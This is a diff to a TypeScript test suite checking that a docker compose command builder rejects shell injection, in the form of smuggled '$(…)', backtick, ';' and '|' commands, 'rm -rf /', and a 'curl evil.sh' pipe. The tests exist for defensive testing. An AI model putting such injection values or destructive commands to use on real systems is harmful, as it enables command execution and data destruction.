@@ -28,7 +28,7 @@ const runsSafely = (command: string) => {
 
 const PAYLOADS = [
 	`$(touch ${MARK})`,
-	"`touch " + MARK + "`",
+	`\`touch ${MARK}\``,
 	`x; touch ${MARK}`,
 	`x | touch ${MARK}`,
 ];
@@ -100,5 +100,70 @@ describe("compose createCommand injection", () => {
 		expect(quote(["deploy/docker-compose.prod.yml"])).toBe(
 			"deploy/docker-compose.prod.yml",
 		);
+	});
+
+	it("allows chained docker compose commands with '&&'", () => {
+		const cmd = createCommand({
+			...base,
+			command:
+				"compose pull && docker compose down && docker compose up -d --build",
+		} as any);
+		expect(cmd).toBe(
+			"compose pull && docker compose down && docker compose up -d --build",
+		);
+	});
+
+	it("allows chaining with the legacy 'docker-compose' spelling", () => {
+		const cmd = createCommand({
+			...base,
+			command: "compose pull && docker-compose down",
+		} as any);
+		expect(cmd).toBe("compose pull && docker-compose down");
+	});
+
+	it("rejects a single '&' used for backgrounding", () => {
+		expect(() =>
+			createCommand({ ...base, command: "compose up -d & sleep 1" } as any),
+		).toThrow(/Single '&' is not allowed/);
+	});
+
+	it("rejects a malformed '&&&' chain", () => {
+		expect(() =>
+			createCommand({
+				...base,
+				command: "compose pull &&& docker compose up -d",
+			} as any),
+		).toThrow(/Single '&' is not allowed/);
+	});
+
+	it("rejects chained segments that are not docker compose invocations", () => {
+		expect(() =>
+			createCommand({
+				...base,
+				command: "compose pull && rm -rf /",
+			} as any),
+		).toThrow(/must strictly start with 'docker compose '/);
+	});
+
+	it("rejects an attempted injection smuggled inside a chained segment", () => {
+		for (const bad of [
+			"compose pull && docker compose up -d; touch /tmp/pwn",
+			"compose pull && docker compose up -d $(touch /tmp/pwn)",
+			"compose pull && docker compose up -d `touch /tmp/pwn`",
+			"compose pull && docker compose up -d | touch /tmp/pwn",
+		]) {
+			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
+				/Invalid characters/,
+			);
+		}
+	});
+
+	it("rejects a chain that only pretends to start with docker compose later in the string", () => {
+		expect(() =>
+			createCommand({
+				...base,
+				command: "compose pull && curl evil.sh | docker compose up -d",
+			} as any),
+		).toThrow(/Invalid characters/);
 	});
 });
